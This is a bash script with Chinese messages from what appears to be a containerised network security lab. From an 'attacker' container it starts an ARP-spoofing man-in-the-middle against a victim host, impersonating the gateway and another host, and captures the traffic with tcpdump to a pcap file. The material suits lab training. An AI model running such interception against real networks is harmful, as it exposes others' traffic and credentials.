#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LAB="network-ad"
ATTACKER="clab-${LAB}-attacker"
NAME="${1:-network}"
DURATION="${2:-90}"
CAPTURE_MITM="${CAPTURE_MITM:-1}"
STARTED_MITM=0

[[ "$NAME" =~ ^[A-Za-z0-9_-]+$ ]] || {
  echo "抓包名称只能包含字母、数字、下划线和连字符" >&2
  exit 1
}
[[ "$DURATION" =~ ^[1-9][0-9]*$ ]] || {
  echo "抓包时长必须是正整数秒" >&2
  exit 1
}

mkdir -p "$ROOT/captures"
FILE="/captures/${NAME}-$(date +%Y%m%d-%H%M%S).pcap"

cleanup() {
  if [[ "$STARTED_MITM" -eq 1 ]]; then
    docker exec "$ATTACKER" \
      pkill -f '^python3 /opt/tools/arp_spoof.py' >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT INT TERM

if [[ "$CAPTURE_MITM" == "1" ]] &&
   ! docker exec "$ATTACKER" \
     pgrep -f '^python3 /opt/tools/arp_spoof.py' >/dev/null 2>&1; then
  echo "启用 ARP 中间人，将 victim 单播流量引入 eth1 ..."
  docker exec -d "$ATTACKER" bash -c "
    exec timeout $((DURATION + 10)) python3 /opt/tools/arp_spoof.py \
      -i eth1 --victim 10.30.50.21 \
      --spoof 10.30.50.254 --spoof 10.30.50.10 \
      >/tmp/capture-arp.log 2>&1
  "
  STARTED_MITM=1
  sleep 2
fi

echo "抓取 ${DURATION}s 到 captures/$(basename "$FILE") ..."
set +e
docker exec "$ATTACKER" bash -c '
  IF=$(ip -o -4 addr show | awk "/10\\.30\\.50\\.99/ {print \$2; exit}")
  timeout "$1" tcpdump -i "$IF" -U -w "$2"
' _ "$DURATION" "$FILE"
capture_rc=$?
set -e
if [[ "$capture_rc" -ne 0 && "$capture_rc" -ne 124 ]]; then
  echo "抓包命令失败，返回码 ${capture_rc}" >&2
  exit "$capture_rc"
fi
echo "完成: $ROOT/captures/$(basename "$FILE")"
